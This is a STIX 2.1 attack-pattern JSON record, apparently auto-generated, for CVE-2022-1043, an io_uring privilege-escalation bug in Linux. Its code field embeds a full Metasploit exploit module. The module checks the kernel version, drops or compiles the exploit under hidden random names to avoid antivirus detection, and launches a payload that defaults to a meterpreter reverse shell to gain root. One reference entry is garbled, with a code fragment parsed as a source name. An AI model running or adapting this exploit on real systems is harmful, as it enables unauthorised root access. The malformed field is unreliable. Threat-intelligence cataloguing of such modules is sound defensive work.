{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7aea2d02-39fc-43be-b933-a01ca18f0258",
    "created": "2024-08-14T16:59:26.657442Z",
    "modified": "2024-08-14T16:59:26.657446Z",
    "name": "io_uring Same Type Object Reuse Priv Esc",
    "description": " This module exploits a bug in io_uring leading to an additional put_cred() that can be exploited to hijack credentials of other processes.  We spawn SUID programs to get the free'd cred object reallocated by a privileged process and abuse them to create a SUID root binary ourselves that'll pop a shell.  The dangling cred pointer will, however, lead to a kernel panic as soon as the task terminates and its credentials are destroyed. We therefore detach from the controlling terminal, block all signals and rest in silence until the system shuts down and we get killed hard, just to cry in vain, seeing the kernel collapse.  The bug affected kernels from v5.12-rc3 to v5.14-rc7.  More than 1 CPU is required for exploitation.  Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/cve_2022_1043_io_uring_priv_esc.rb",
            "external_id": "cve_2022_1043_io_uring_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://grsecurity.net/exploiting_and_defending_against_same_type_object_reuse"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/opensrcsec/same_type_object_reuse_exploits"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/torvalds/linux/commit/a30f895ad3239f45012e860d4f94c1a388b36d14"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-1043"
        },
        {
            "source_name": "code=strip_comments(exploit_source(CVE-2022-1043",
            "external_id": "cve-2022-1043.c))"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Linux::Compile\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'io_uring Same Type Object Reuse Priv Esc',\n        'Description' => %q{\n          This module exploits a bug in io_uring leading to an additional put_cred()\n          that can be exploited to hijack credentials of other processes.\n\n          We spawn SUID programs to get the free'd cred object reallocated by a\n          privileged process and abuse them to create a SUID root binary ourselves\n          that'll pop a shell.\n\n          The dangling cred pointer will, however, lead to a kernel panic as soon as\n          the task terminates and its credentials are destroyed. We therefore detach\n          from the controlling terminal, block all signals and rest in silence until\n          the system shuts down and we get killed hard, just to cry in vain, seeing\n          the kernel collapse.\n\n          The bug affected kernels from v5.12-rc3 to v5.14-rc7.\n\n          More than 1 CPU is required for exploitation.\n\n          Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Ryota Shiga', # discovery\n          'Mathias Krause' # original PoC, analysis\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'URL', 'https://grsecurity.net/exploiting_and_defending_against_same_type_object_reuse' ],\n          [ 'URL', 'https://github.com/opensrcsec/same_type_object_reuse_exploits' ],\n          [ 'URL', 'https://github.com/torvalds/linux/commit/a30f895ad3239f45012e860d4f94c1a388b36d14' ],\n          [ 'CVE', '2022-1043' ]\n        ],\n        'DisclosureDate' => '2022-03-22',\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'PrependFork' => true\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  # Simplify pulling the writable directory variable\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    # Check the kernel version to see if its in a vulnerable range\n    release = kernel_release\n    if Rex::Version.new(release.split('-').first) > Rex::Version.new('5.14-rc7') ||\n       Rex::Version.new(release.split('-').first) < Rex::Version.new('5.12-rc3')\n      vprint_error \"Kernel version #{release} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Kernel version #{release} appears to be vulnerable\"\n\n    # make sure we have enough CPUs. Minimum 2 required\n    cpu = get_cpu_info\n    if cpu[:cores] < 2\n      CheckCode::Safe(\"> 1 CPU required, detected: #{cpu[:cores]}\")\n    end\n    CheckCode::Vulnerable(\"> 1 CPU required, detected: #{cpu[:cores]}\")\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'\n    end\n\n    # Make sure we can write our exploit and payload to the local system\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Upload exploit executable, writing to a random name so AV doesn't have too easy a job\n    executable_name = \".#{rand_text_alphanumeric(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      code = strip_comments(exploit_source('CVE-2022-1043', 'cve-2022-1043.c'))\n      upload_and_compile executable_path, code\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx executable_path, exploit_data('CVE-2022-1043', 'pre_compiled')\n    end\n\n    # Upload payload executable\n    upload_and_chmodx payload_path, generate_payload_exe\n    register_files_for_cleanup(payload_path)\n    register_files_for_cleanup(executable_path)\n\n    timeout = 30\n    print_status 'Launching exploit...'\n    output = cmd_exec \"echo '#{payload_path} & exit' | #{executable_path}\", nil, timeout\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-03-22",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}